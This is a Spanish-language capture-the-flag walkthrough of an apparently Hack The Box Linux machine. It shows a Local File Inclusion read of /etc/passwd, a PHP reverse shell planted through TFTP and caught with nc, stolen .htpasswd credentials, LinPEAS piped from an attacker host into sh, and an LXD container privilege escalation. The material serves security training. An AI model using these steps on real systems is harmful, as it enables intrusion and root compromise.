# Included

### 1. 📝 **Introducción**

* **Nivel de Dificultad**: Muy fácil.
* **Tags:**&#x20;
  * **PHP**: PHP es un lenguaje de programación ampliamente utilizado para el desarrollo web, especialmente en aplicaciones dinámicas. Debido a su gran flexibilidad, es común encontrar aplicaciones personalizadas que no siguen las mejores prácticas de seguridad. Esto puede generar vulnerabilidades como inyecciones de código o fallos en el manejo de datos sensibles. La seguridad en aplicaciones PHP requiere configuraciones cuidadosas, validación de entrada y el uso de buenas prácticas en el manejo de sesiones y contraseñas.
  * **Custom Applications (Aplicaciones Personalizadas)**: Las _Custom Applications_ son aquellas aplicaciones desarrolladas específicamente para satisfacer necesidades particulares de una organización. Estas aplicaciones pueden carecer de las mejores prácticas de seguridad, lo que puede generar vulnerabilidades significativas si no se gestionan correctamente. Además, debido a que son diseñadas a medida, es más difícil llevar a cabo auditorías de seguridad y mantenerlas actualizadas.
  * **Protocols (Protocolos)**: Los protocolos son un conjunto de reglas y estándares que permiten la comunicación entre dispositivos en una red. Ejemplos de protocolos incluyen TCP/IP, HTTP, SMB y FTP. Comprender cómo funcionan los protocolos es clave en las pruebas de penetración, ya que a menudo son los puntos de acceso utilizados por los atacantes. Una configuración incorrecta de estos protocolos puede crear vectores de ataque, permitiendo que los atacantes exploten vulnerabilidades.
  * **Apache**: Apache es uno de los servidores web más utilizados, conocido por su flexibilidad y su capacidad para manejar aplicaciones web dinámicas y estáticas. Sin embargo, si no se configura adecuadamente, Apache puede ser vulnerable a una variedad de ataques como inyecciones SQL, ejecución remota de código o divulgación de información sensible. Asegurarse de que Apache esté correctamente configurado y actualizado es esencial para mitigar estos riesgos.
  * **TFTP (Trivial File Transfer Protocol)**: TFTP es un protocolo de transferencia de archivos simplificado, usado principalmente en redes para transferir archivos de configuración o sistemas operativos. A pesar de su utilidad, TFTP no proporciona mecanismos de seguridad, como autenticación o cifrado, lo que lo convierte en un blanco fácil para ataques. El uso de TFTP debe ser restringido a redes internas o entornos controlados, donde no haya riesgos de exposición.
  * **LXD**: LXD es una herramienta de contenedores para sistemas Linux que permite ejecutar aplicaciones de manera aislada, ofreciendo un entorno seguro y eficiente. Aunque LXD es útil para gestionar contenedores y facilitar el aislamiento de aplicaciones, una configuración incorrecta puede exponer los contenedores a vulnerabilidades, permitiendo a un atacante escapar del contenedor y acceder a recursos no autorizados del sistema host.
  * **Reconnaissance (Reconocimiento)**: El _Reconocimiento_ es una fase crítica en las pruebas de penetración, en la que se recopila toda la información posible sobre el objetivo, como puertos abiertos, servicios en ejecución y configuraciones de seguridad. Las herramientas y técnicas como escaneo de puertos, análisis de tráfico y descubrimiento de versiones son esenciales en esta fase para identificar vectores de ataque y debilidades en la infraestructura.
  * **Local File Inclusion (LFI)**: La vulnerabilidad de _Local File Inclusion_ ocurre cuando un atacante puede incluir archivos locales en un servidor a través de una entrada de usuario no validada. Esto puede permitir la ejecución de código malicioso o la exposición de archivos sensibles, lo que compromete la seguridad de la aplicación. La mitigación de LFI implica validar estrictamente las rutas de archivos y emplear medidas de seguridad adecuadas para restringir el acceso a archivos del sistema.
  * **Clear Text Credentials (Credenciales en Texto Claro)**: Las _Clear Text Credentials_ son credenciales que se transmiten sin cifrado, lo que permite a un atacante interceptarlas fácilmente en una red. Esta vulnerabilidad es común en protocolos como HTTP o FTP si no se utiliza cifrado. Es fundamental que las credenciales se manejen de manera segura, utilizando protocolos como HTTPS o SSH para cifrar la información sensible durante la transmisión.
  * **Arbitrary File Upload (Carga Arbitraria de Archivos)**: La _Arbitrary File Upload_ es una vulnerabilidad que permite a un atacante cargar archivos no autorizados en un servidor, lo que puede incluir scripts maliciosos, archivos ejecutables o incluso archivos con configuraciones dañinas. Esta vulnerabilidad es peligrosa porque permite la ejecución remota de código en el servidor. Para mitigarla, es importante validar los tipos de archivo y las extensiones antes de permitir que los usuarios carguen archivos en el servidor.

### 2. 🛠️ **Entorno**

Nos descargamos nuestra VPN y nos conectamos.

```
sudo openvpn nombre_del_archivo.vpn
```

Iniciamos la máquina y verificamos la conexión.

```bash
ping -c 1 10.129.69.1
```

<figure><img src="../../../.gitbook/assets/image (1208).png" alt=""><figcaption></figcaption></figure>

Observamos que tenemos conexión y que es una máquina **Linux** ya que su **ttl=63**.

### 3. 🔍 **Reconocimiento**

A continuación, se realiza el comando:

```bash
nmap -sCV -Pn 10.129.69.1
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.&#x20;

<figure><img src="../../../.gitbook/assets/image (1209).png" alt=""><figcaption></figcaption></figure>

### 4. 🚪 **Acceso Inicial**

Como podemos observar durante el escaneo, el puerto **80** perteneciente al servicio **HTTP** está abierto. A continuación, se indagará más sobre estos servicios.

<figure><img src="../../../.gitbook/assets/image (1210).png" alt=""><figcaption></figcaption></figure>

Tenemos la vulnerabilidad Local File Inclusion.

```bash
http://10.129.69.1/?file=/etc/passwd
```

<figure><img src="../../../.gitbook/assets/image (1211).png" alt=""><figcaption></figcaption></figure>

Vemos que tenemos un servicio **tftp** por lo que podemos subir una Reverse Shell.

{% embed url="https://www.revshells.com/" %}

<figure><img src="../../../.gitbook/assets/image (1212).png" alt=""><figcaption></figcaption></figure>

Nos ponemos en esucha.

```bash
http://10.129.69.1/?file=/var/lib/tftpboot/hola.php

nc -lnvp 4444
```

<figure><img src="../../../.gitbook/assets/image (1213).png" alt=""><figcaption></figcaption></figure>

Vamos al directorio `/var/www/html` para ver el contenido **.htpasswd**.

<figure><img src="../../../.gitbook/assets/image (1214).png" alt=""><figcaption></figcaption></figure>

Nos logueamos con esas credenciales.

<figure><img src="../../../.gitbook/assets/image (1215).png" alt=""><figcaption></figcaption></figure>

Nos descargamos **LinPeas.sh**.

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/20240131-07961633/linpeas.sh
```

Nos la trasladamos a mike.

```bash
python3 http.server
#Terminal Mike
curl http://10.10.16.35:8000/linpeas.sh | sh
```

<figure><img src="../../../.gitbook/assets/image (1216).png" alt=""><figcaption></figcaption></figure>

En nuestra máquina local.

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686
```

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2025-02-14 111913.png" alt=""><figcaption></figcaption></figure>

En nuestra máquina remota.

```bash
wget http://10.10.16.35:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

<figure><img src="../../../.gitbook/assets/image (1217).png" alt=""><figcaption></figcaption></figure>

Ejcutamos y creamos el contenedor para ponerlo en marcha.

```bash
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias tidur
lxc init tidur my-container
lxc start my-container
lxc exec my-container -- /bin/sh
```

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2025-02-14 112334.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Captura de pantalla 2025-02-14 112911.png" alt=""><figcaption></figcaption></figure>
